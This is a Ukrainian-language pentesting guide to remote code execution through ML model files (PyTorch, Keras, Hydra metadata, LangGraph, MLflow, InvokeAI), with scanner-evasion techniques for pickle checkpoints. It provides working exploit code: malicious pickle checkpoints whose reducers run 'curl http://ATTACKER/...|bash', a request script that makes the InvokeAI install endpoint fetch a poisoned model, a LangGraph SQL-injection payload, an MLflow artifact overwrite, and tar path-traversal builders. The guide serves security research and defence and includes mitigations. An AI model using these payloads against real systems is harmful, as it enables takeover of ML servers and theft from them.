# Моделі RCE

{{#include ../banners/hacktricks-training.md}}

## Завантаження моделей для RCE

Моделі машинного навчання зазвичай поширюють у різних форматах, як-от ONNX, TensorFlow, PyTorch тощо. Їх можна завантажувати на комп’ютери розробників або у виробничі системи для використання. Зазвичай моделі не повинні містити шкідливого коду, але в деяких випадках модель може виконувати довільний код у системі як передбачену функцію або через вразливість у бібліотеці завантаження моделей.

У таблиці нижче наведено типові вразливості цієї категорії:

| **Фреймворк / Інструмент**        | **Вразливість (CVE, якщо доступний)**                                                    | **Вектор RCE**                                                                                                                           | **Джерела**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Небезпечна десеріалізація в* `torch.load` **(CVE-2025-32434)**                                                              | Шкідливий pickle у checkpoint моделі призводить до виконання коду (в обхід захисту `weights_only`)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + завантаження шкідливої моделі призводять до виконання коду; RCE через десеріалізацію Java в API керування                                        | |
| **NVIDIA Merlin Transformers4Rec** | Небезпечна десеріалізація checkpoint через `torch.load` **(CVE-2025-23298)**                                           | Ненадійний checkpoint запускає pickle reducer під час `load_model_trainer_states_from_checkpoint` → виконання коду в ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + небезпечний хук розширення MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | Ключ `filter`, контрольований користувачем, вставляє синтаксис SQL/JSON-path, `UNION SELECT` створює фальшивий рядок checkpoint, після чого десеріалізація `msgpack` імпортує та викликає код Python, вибраний зловмисником | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (небезпечний YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Завантаження моделі з YAML використовує `yaml.unsafe_load` (виконання коду) <br> Завантаження моделі з шаром **Lambda** виконує довільний код Python          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (розбір TFLite)                                                                                          | Спеціально сформована модель `.tflite` спричиняє переповнення цілого числа → пошкодження heap (потенційний RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Завантаження моделі через `joblib.load` виконує pickle з payload `__reduce__` зловмисника                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (небезпечний `np.load`) *оспорюється*                                                                              | Типова поведінка `numpy.load` дозволяла масиви об’єктів pickle — шкідливий `.npy/.npz` призводить до виконання коду                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (обхід каталогів) <br> **CVE-2024-5187** (обхід каталогів у tar)                                                    | Шлях до зовнішніх ваг моделі ONNX може виходити за межі каталогу (читання довільних файлів) <br> Шкідливий tar-архів моделі ONNX може перезаписувати довільні файли (що призводить до RCE) | |
| ONNX Runtime (ризик конструкції)  | *(Без CVE)* Користувацькі операції ONNX / керування потоком                                                                                    | Модель із користувацьким оператором потребує завантаження нативного коду зловмисника; складні графи моделі зловживають логікою для виконання непередбачених обчислень   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (обхід шляхів)                                                                                          | Використання API завантаження моделей із увімкненим `--model-control` дозволяє обхід відносних шляхів для запису файлів (наприклад, перезапис `.bashrc` для RCE)    | |
| **GGML (формат GGUF)**      | **CVE-2024-25664 … 25668** (кілька переповнень heap)                                                                         | Пошкоджений файл моделі GGUF спричиняє переповнення буфера heap у парсері, що дає змогу виконати довільний код у системі жертви                     | |
| **Keras (старі формати)**   | *(Без нових CVE)* Застаріла модель Keras H5                                                                                         | Шкідлива модель HDF5 (`.h5`) із шаром Lambda усе ще виконує код під час завантаження (Keras safe_mode не охоплює старий формат — «атака зі зниженням версії») | |
| **Інші** (загальне)        | *Недолік конструкції* – серіалізація Pickle                                                                                         | Багато інструментів ML (наприклад, формати моделей на основі pickle, Python `pickle.load`) виконують довільний код, вбудований у файли моделей, якщо це не нейтралізовано | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Ненадійні метадані передаються в `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Метадані/конфігурація моделі, контрольовані зловмисником, задають `_target_` як довільний викликуваний об’єкт (наприклад, `builtins.exec`) → виконується під час завантаження, навіть із «безпечними» форматами (`.safetensors`, `.nemo`, `config.json` репозиторію) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Крім того, існують моделі на основі Python pickle, як-от ті, що використовуються в [PyTorch](https://github.com/pytorch/pytorch/security), за допомогою яких можна виконати довільний код у системі, якщо завантажувати їх без `weights_only=True`. Тому будь-яка модель на основі pickle може бути особливо вразливою до цього типу атак, навіть якщо її не наведено в таблиці вище.

### Обхід статичних перевірок checkpoint на основі pickle

Шлях завантаження моделі, що викликає необмежений `pickle.load()`, `joblib.load()` або `torch.load(..., weights_only=False)`, є точкою виконання коду, а не просто парсером.<sup>[[22]](#references)</sup> У PyTorch 2.6 для `torch.load()` типове значення — `weights_only=True`, якщо не передано власний модуль pickle; наведені нижче приклади потребують необмеженого завантажувача або застосунку, який вимикає цей захист, щоб завантажити непідтримуваний об’єкт.<sup>[[4]](#references)</sup> Чистий результат статичного сканування не змінює цього.<sup>[[21]](#references)</sup>

Див. [десеріалізацію Python pickle](../pentesting-web/deserialization/#pickle), щоб ознайомитися з базовим примітивом `__reduce__`, і [список дозволених імпортів ML у Fickling](keras-model-deserialization-rce-and-gadget-hunting.md#ml-pickle-import-allowlisting-for-aiml-models-fickling), щоб дізнатися про перевірки імпорту під час виконання.

#### Зареєструвати викликуваний об’єкт, а потім отримати його через `EXT2`

Pickle може викликати `copyreg.add_extension` через `REDUCE`, реєструючи пару «модуль/назва» під вибраним зловмисником числовим кодом розширення. Пізніше `EXT2` отримує цей об’єкт за кодом, а інший `REDUCE` може його викликати. Отже, критичний викликуваний об’єкт не є операндом opcode `GLOBAL` або `STACK_GLOBAL`. Binarly продемонструвала це на `multiprocessing.util.spawnv_passfds`; чотири з п’яти оцінених сканерів не виявили цю техніку, тоді як SaferPickle її виявив. Зміна реєстру та отримання об’єкта через `EXT2` відбуваються в межах тієї самої операції unpickling.<sup>[[21]](#references)[[22]](#references)</sup>

```text
GLOBAL       'copyreg add_extension'
BINUNICODE   'multiprocessing.util'
BINUNICODE   'spawnv_passfds'
BININT2      31337
TUPLE3
REDUCE       # register the extension
POP
EXT2         31337  # resolve the callable
# Push its arguments, then REDUCE to call it
```

Це ескіз opcode, а не повна контрольна копія: зовнішній завантажувач має приймати навколишній потік pickle. Сканер, який шукає небезпечні callable лише в операндах `GLOBAL`, не помітить пізніший пошук; сканер без підтримки `EXT2` може завершити роботу до винесення вердикту. Суворий список дозволених елементів усе одно може відхилити саму `copyreg.add_extension`.<sup>[[21]](#references)</sup>

#### Приховування сконструйованих типів code object за звичайними функціями

Інший ланцюжок pickle може отримати `FunctionType` через `type(copy.copy)`, а `CodeType` — через `type(copy.copy.__code__)`, потім створити code object із наданого байткоду, обгорнути його у функцію та викликати її. Опублікований варіант отримує `__code__` через `operator.methodcaller('__getattribute__', '__code__')`, тож pickle не мусить імпортувати жоден із конструкторів за іменем. Розташування полів `CodeType(...)` і байткод залежать від версії CPython; корисне навантаження, створене для іншого інтерпретатора, може завершитися помилкою до виконання. SaferPickle усе ж позначив наведений зразок, але знизив його рівень до `suspicious`; решта чотирьох оцінених сканерів його пропустила.<sup>[[21]](#references)[[22]](#references)</sup>

```python
from copy import copy
from operator import methodcaller
function_type = type(copy)
code_type = type(methodcaller('__getattribute__', '__code__')(copy))
# REDUCE can construct code_type(...) and function_type(code, {})
```

#### Запустити завантаження другої моделі з аргументу pickle

Зовнішній pickle може викликати `torch.storage._load_from_bytes`, передавши йому як аргумент серіалізовану модель, контрольовану зловмисником. Ця функція викликає `torch.load(io.BytesIO(b), weights_only=False)`, тому вкладена модель десеріалізується без обмеження `weights_only`, хоча для сканера верхньорівневих opcode це виглядає як передавання байтів одній callable-функції. Зовнішнє завантаження все одно має дозволяти виклик цієї функції; `weights_only=True` автоматично не змушує зовнішній pickle прийняти її. Сканери, які не аналізують вкладені байти рекурсивно, можуть пропустити внутрішній ланцюжок `GLOBAL`/`REDUCE`.<sup>[[21]](#references)[[23]](#references)</sup>

#### Визначити застаріле ім’я модуля pickle під час завантаження

Для протоколів pickle нижче 3 значення `fix_imports=True` за замовчуванням у Python перенаправляє посилання `GLOBAL` на `commands.run` до `subprocess.run` через `_compat_pickle.IMPORT_MAPPING`. Тож сканер, який порівнює буквальний рядок модуля зі списком заборонених модулів, що містить `subprocess`, може не виявити callable-функцію, яка буде викликана під час виконання. Для цього потрібен завантажувач, який зберігає таблицю відповідності сумісності та приймає отримані аргументи виклику.<sup>[[21]](#references)[[24]](#references)[[25]](#references)</sup>

#### Спрямувати checkpoint не у форматі ZIP повз сканер, який перевіряє лише ZIP

Вибір формату може дати збій незалежно від перевірки opcode: Binarly виявила, що ModelScan 0.8.8 спрямовував файли `.bin`, `.pt`, `.pth` і `.ckpt` до спеціалізованого сканера PyTorch для ZIP, а потік pickle не у форматі ZIP пропускав, замість того щоб передати його сканеру звичайного pickle. Також було задокументовано застаріле компонування моделі у форматі TAR, яке приймає `torch.load()`, але яке не перевіряли ModelScan і JFrog. Це прогалини, притаманні певним версіям сканерів, а не властивість кожного сканера моделей.<sup>[[21]](#references)</sup>

#### Виконати код до того, як статичний парсер дійде до пошкодженого кінця

Сканер, який повністю обходить pickle за допомогою `pickletools.genops()`, може згенерувати помилку на обрізаному opcode після коректного `REDUCE`. Небмежений unpickler уже викликав callable-функцію до того, як натрапив на цей кінець, навіть якщо згодом усе завантаження завершиться помилкою. У наведеному зразку одразу після `REDUCE`, який виконував код, було розміщено обрізаний `BINUNICODE`, через що `pickletools.genops()` завершився помилкою, хоча побічний ефект — запис у файл — уже відбувся. Це обходить сканер лише тоді, коли він вважає помилку розбору ознакою безпеки або пропускає файл. Цей спосіб корисний лише тоді, коли побічний ефект має значення без успішно поверненої моделі; ціль, якій потрібне повне завантаження, може відхилити такий артефакт.<sup>[[21]](#references)</sup>

### Метадані Hydra → RCE (працює навіть із safetensors)

`hydra.utils.instantiate()` імпортує та викликає будь-яку dotted-запис `_target_` в об’єкті конфігурації/метаданих. Якщо бібліотеки на кшталт Hugging Face Transformers передають **недовірені метадані моделі** у `instantiate()`, зловмисник може передати callable-функцію та аргументи, які негайно виконаються під час завантаження моделі (pickle не потрібен).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Приклад payload (працює в `model_config.yaml` файлу `.nemo`, `config.json` репозиторію або `__metadata__` всередині `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Ключові моменти:
- Спрацьовує до ініціалізації моделі в `restore_from/from_pretrained` у NeMo, кодерах uni2TS HuggingFace та завантажувачах FlexTok.
- Рядковий block-list Hydra можна обійти за допомогою альтернативних шляхів імпорту (наприклад, `enum.bltns.eval`) або імен, визначених застосунком (наприклад, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- FlexTok також розбирає рядкові метадані за допомогою `ast.literal_eval`, що дає змогу спричинити DoS (надмірне споживання CPU/пам’яті) до виклику Hydra.

### 🆕  RCE в InvokeAI через `torch.load` (CVE-2024-12029)

`InvokeAI` — популярний вебінтерфейс із відкритим кодом для Stable-Diffusion. Версії **5.3.1 – 5.4.2** надають REST endpoint `/api/v2/models/install`, який дає змогу користувачам завантажувати моделі з довільних URL.<sup>[[1]](#references)</sup>

Зрештою цей endpoint викликає:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Коли наданий файл є **чекпойнтом PyTorch (`*.ckpt`)**, `torch.load` виконує **десеріалізацію pickle**. Оскільки вміст надходить безпосередньо з URL, контрольованого користувачем, зловмисник може вбудувати в чекпойнт шкідливий об’єкт із власним методом `__reduce__`; цей метод виконується **під час десеріалізації**, що призводить до **віддаленого виконання коду (RCE)** на сервері InvokeAI.

Уразливості присвоєно ідентифікатор **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Покрокова демонстрація експлуатації

1. Створіть шкідливий чекпойнт:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Розмістіть `payload.ckpt` на HTTP-сервері під вашим контролем (наприклад, `http://ATTACKER/payload.ckpt`).
3. Викличте вразливу кінцеву точку (автентифікація не потрібна):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Коли InvokeAI завантажує файл, він викликає `torch.load()` → запускається gadget `os.system`, і зловмисник отримує виконання коду в контексті процесу InvokeAI.

Готовий exploit: модуль **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` автоматизує весь процес.<sup>[[3]](#references)</sup>

#### Умови

•  InvokeAI 5.3.1-5.4.2 (прапорець scan за замовчуванням **false**)
•  `/api/v2/models/install` доступний зловмиснику
•  Процес має дозволи на виконання команд оболонки

#### Заходи захисту

* Оновіть до **InvokeAI ≥ 5.4.3** — виправлення встановлює `scan=True` за замовчуванням і виконує сканування на malware перед десеріалізацією.<sup>[[2]](#references)</sup>
* Під час програмного завантаження checkpoint використовуйте `torch.load(file, weights_only=True)` або новий helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Використовуйте allow-list / підписи для джерел моделей і запускайте сервіс із мінімально необхідними привілеями.

> ⚠️ Пам’ятайте, що будь-який формат на основі Python pickle (зокрема багато файлів `.pt`, `.pkl`, `.ckpt`, `.pth`) за своєю суттю небезпечно десеріалізувати з ненадійних джерел.

---

Приклад ad-hoc заходу захисту, якщо потрібно й надалі запускати старіші версії InvokeAI за reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE через unsafe `torch.load` (CVE-2025-23298)

Transformers4Rec від NVIDIA (частина Merlin) містив небезпечний завантажувач checkpoint, який безпосередньо викликав `torch.load()` для шляхів, наданих користувачем. Оскільки `torch.load` використовує Python `pickle`, checkpoint, контрольований зловмисником, може виконати довільний код через reducer під час десеріалізації.<sup>[[5]](#references)</sup>

Вразливий шлях (до виправлення): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Чому це призводить до RCE: у Python pickle об’єкт може визначити reducer (`__reduce__`/`__setstate__`), який повертає callable і аргументи. Callable виконується під час unpickling. Якщо такий об’єкт є в checkpoint, він запускається до використання будь-яких ваг.

Мінімальний приклад шкідливого checkpoint:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Вектори доставки та радіус ураження:
- Троянізовані чекпойнти/моделі, поширені через репозиторії, buckets або реєстри артефактів
- Автоматизовані конвеєри відновлення/розгортання, які автоматично завантажують чекпойнти
- Виконання відбувається всередині воркерів навчання/інференсу, часто з підвищеними привілеями (наприклад, від root у контейнерах)

Виправлення: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) замінив прямий виклик `torch.load()` на обмежений десеріалізатор із дозволеним списком, реалізований у `transformers4rec/utils/serialization.py`. Новий завантажувач перевіряє типи/поля та не дозволяє викликати довільні функції під час завантаження.<sup>[[7]](#references)</sup>

Рекомендації щодо захисту, специфічні для чекпойнтів PyTorch:
- Не розпаковуйте pickle з ненадійних даних. За можливості віддавайте перевагу форматам без виконуваного коду, як-от [Safetensors](https://huggingface.co/docs/safetensors/index) або ONNX.
- Якщо потрібно використовувати серіалізацію PyTorch, переконайтеся, що встановлено `weights_only=True` (підтримується в новіших версіях PyTorch), або використовуйте власний unpickler із дозволеним списком, подібний до виправлення Transformers4Rec.<sup>[[4]](#references)</sup>
- Перевіряйте походження/підписи моделей та ізолюйте десеріалізацію (seccomp/AppArmor; користувач без root; обмежена ФС і без вихідного мережевого трафіку).
- Відстежуйте неочікувані дочірні процеси, запущені ML-сервісами під час завантаження чекпойнтів; відстежуйте використання `torch.load()`/`pickle`.

Посилання на POC і вразливу версію/виправлення:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Вразливий завантажувач до виправлення: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC зі шкідливим чекпойнтом: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Завантажувач після виправлення: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Приклад — створення шкідливої моделі PyTorch

- Створіть модель:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Завантажте модель:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Десеріалізація Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

FaceDetection-DSFD від Tencent надає endpoint `resnet`, який десеріалізує дані, контрольовані користувачем. ZDI підтвердила, що віддалений зловмисник може змусити жертву відкрити шкідливу сторінку/файл, передати на цей endpoint спеціально сформований серіалізований blob і запустити десеріалізацію з правами `root`, що призведе до повної компрометації.

Сценарій експлуатації подібний до типового зловживання pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Будь-який gadget, доступний під час десеріалізації (конструктори, `__setstate__`, callbacks фреймворку тощо), можна використати як зброю так само, незалежно від того, чи транспортом був HTTP, WebSocket або файл, поміщений у каталог, за яким ведеться спостереження.



### LangGraph checkpointer SQLi → MessagePack RCE

Цей ланцюжок атак цікавий тим, що атакувальнику **не потрібно завантажувати шкідливий файл моделі**. Натомість застосунок надає **API для збереження стану AI-агента** (`get_state_history(..., filter=...)`), а введені користувачем дані потрапляють до побудовника запитів checkpointer.

#### 1. Структурна SQLi у фільтрах метаданих

Вразливий шаблон SQLite мав такий вигляд:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

Значення прив’язується пізніше, але `query_key` конкатенується в **рядок шляху JSON**, тому символ `'` усередині ключа словника виходить за межі `'$.{query_key}'` і дає змогу ін’єктувати SQL. Це саме стосується **шляхів JSON, ідентифікаторів, операторів, `LIMIT` і полів TTL**: плейсхолдери захищають лише значення, але не структурний синтаксис запиту.

#### 2. `UNION SELECT` може націлюватися на подальші sinks, а не лише викрадати дані

Запит повертає `type` і серіалізовані байти `checkpoint`, які згодом використовуються як:

```python
self.serde.loads_typed((type, checkpoint))
```

Це означає, що SQLi в умові `WHERE` може впровадити **фальшивий рядок результату**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Якщо подальший код розбирає, десеріалізує, записує або виконує будь-який вибраний стовпець, зіставте ці стовпці з їхніми sinks. У цьому випадку фальшивий рядок перетворює SQLi на **десеріалізацію, контрольовану атакувальником**.

#### 3. Небезпечні хуки розширень MessagePack еквівалентні code gadgets

Шлях `msgpack` у LangGraph використовував власний хук розширення, який розпаковував вкладений кортеж і виконував:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Отже, об’єкт розширення MessagePack, що кодує щось еквівалентне `("os", "system", "id > /tmp/pwned")`, імпортує `os`, знаходить `system` і виконує команду. Під час аудиту AI-фреймворків перевіряйте **власні ревівери MessagePack/JSON/pickle** на наявність динамічного імпорту, рефлексії або довільного виклику функцій.

#### 4. Практичний шаблон аудиту фреймворків агентів

Перевіряйте будь-які контрольовані користувачем вхідні дані, які потрапляють до:
- API для переліку історії стану / пам’яті / відтворення / контрольних точок
- конструкторів структурованих фільтрів, що генерують SQL- або Redis-фрагменти запитів
- власних десеріалізаторів (`pickle`, `msgpack`, хуків об’єктів `json`, конструкторів YAML)
- шляхів відновлення, які довіряють рядкам, отриманим із рівня зберігання даних

Цей конкретний ланцюжок зачіпав розгортання LangGraph із самостійним хостингом, що використовували чекпойнтери **SQLite** або **Redis**, коли ненадійні користувачі могли керувати `filter`. У розкритті вказані такі виправлені версії: `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` і `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Перезапис артефакту MLflow PyFunc призводить до pickle RCE

MLflow PyFunc, створений на основі `PythonModel`, може зберігати серіалізований об’єкт як `python_model.pkl`. У метаданих моделі вказано `mlflow.pyfunc.model` як її завантажувач, а реалізація MLflow використовує це ім’я файлу для збереженої моделі Python. Отже, право запису до сховища артефактів може призвести до виконання коду в іншій програмі, яка згодом завантажить модель.<sup>[[17]](#references)[[18]](#references)</sup>

Корисний ланцюжок такий: **дозвіл на запис артефактів → заміна pickle → примусове перезавантаження артефакту споживачем інференсу**. Для експерименту з кореневим шляхом `mlflow-artifacts:/...`, доступним через проксі, перелічіть експеримент, запуск і шлях до артефакту моделі. Tracking-сервер надає `GET` і `PUT` для `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Мінімальний reducer може виконати команду, щойно споживач десеріалізує артефакт. Генерування payload за допомогою версії Python, зазначеної в `MLmodel`, допомагає уникнути проблем із сумісністю.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Запустіть операцію, яка **завантажує наявну модель**, наприклад прогнозування, оцінювання або розгортання. Спочатку не перенавчайте модель, оскільки під час навчання шкідливий артефакт може бути замінено новою моделлю. Помилка застосунку не спростовує факт експлуатації: reducer повертає ціле число — код завершення команди, а не придатну до використання модель. Почніть із помітного побічного ефекту, наприклад ICMP- або HTTP-зворотного виклику, а потім замініть його на кінцеве навантаження.<sup>[[20]](#references)</sup>

Під час оцінювання розрізняйте дозвіл на створення запуску та дозвіл на перезапис артефактів, що належать іншому запуску. Перевірте автентифікацію та дозволи на оновлення для кожного запуску, дослідіть несподівані зміни `python_model.pkl` і враховуйте походження та цілісність моделі як частину межі виконання. Поточний код MLflow також підтримує параметр `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` і рекомендує використовувати артефакти models-from-code замість завантаження даних cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

### Відкриті сервери моделей та ML-інфраструктура

Завантаження шкідливої моделі — не єдиний спосіб виконати код в ML-інфраструктурі. API надсилання завдань, кінцеві точки перевірки коду та отримання моделей із реєстру самостійно розміщених AI-сервісів можуть призвести до виконання коду без будь-якого файлу моделі. Див. [Відкриті самостійно розміщені AI-сервіси](AI-Exposed-Self-Hosted-AI-Services.md).

## Моделі для Path Traversal

Як зазначено в [**цій публікації блогу**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), більшість форматів моделей, що використовуються різними AI-фреймворками, ґрунтуються на архівах, зазвичай `.zip`. Тому ці формати можуть бути вразливими до атак path traversal, які дають змогу читати довільні файли в системі, де завантажується модель.<sup>[[16]](#references)</sup>

Наприклад, за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить файл у каталозі `/tmp`:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Або за допомогою наведеного нижче коду можна створити модель, яка під час завантаження створить символічне посилання на каталог `/tmp`:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Поглиблений розбір: десеріалізація Keras .keras і пошук gadget-ів

Ознайомтеся з цим спеціалізованим посібником із внутрішньої будови .keras, RCE через Lambda-layer, проблеми довільного імпорту у версіях ≤ 3.8 і пошуку gadget-ів після виправлення в allowlist:


{{#ref}}
keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Блог OffSec – "CVE-2024-12029 – десеріалізація недовірених даних в InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Коміт виправлення InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Документація модуля Metasploit від Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – міркування щодо безпеки torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Блог ZDI – CVE-2025-23298: отримання віддаленого виконання коду в NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Повідомлення ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Коміт виправлення Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Вразливий завантажувач до виправлення (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC зі шкідливим checkpoint (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Завантажувач після виправлення (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [12] [Unit 42 – віддалене виконання коду з сучасними форматами та бібліотеками AI/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Документація Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Коміт block-list для Hydra (попередження про RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – від SQLi до RCE: експлуатація checkpointer LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Як перетворити вразливості Archive Slip на цінні AI/ML баунті](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Повідомлення Snyk і доказ концепції PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Код MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [MLflow REST API – кінцеві точки завантаження та вивантаження артефактів](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
- [21] [Таксономія ухилення від статичного сканера Binarly MLTracer](https://raw.githubusercontent.com/binarly-io/ai-supply-chain-attacks-research/master/MLTracer/evasion.md)
- [22] [Binarly – виявлення шкідливих моделей за допомогою MLTracer](https://binarly.io/blog/malicious-model-detection-mltracer)
- [23] [Реалізація PyTorch storage `_load_from_bytes`](https://raw.githubusercontent.com/pytorch/pytorch/main/torch/storage.py)
- [24] [Таблиця сумісності `find_class` у pickle CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/pickle.py)
- [25] [Таблиця імпорту `_compat_pickle` у CPython](https://raw.githubusercontent.com/python/cpython/main/Lib/_compat_pickle.py)
